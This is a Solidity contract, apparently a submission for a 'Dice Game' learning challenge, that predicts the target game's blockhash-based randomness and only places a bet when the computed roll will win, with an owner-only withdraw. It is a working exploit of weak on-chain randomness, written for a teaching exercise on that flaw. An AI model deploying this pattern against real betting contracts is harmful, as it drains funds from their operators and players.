pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw() public onlyOwner {
        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "failed to send ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        require(msg.value >= 0.002 ether, "Failed to send enough value");

        bytes32 prevHash = blockhash(block.number - 1);
        address diceGameAddress = address(diceGame);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGameAddress, diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("");
        console.log('\t',"   Rigged Game Roll:", roll);
        require(roll <= 2, "NOT WIN");
        diceGame.rollTheDice{ value: msg.value}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
    
}
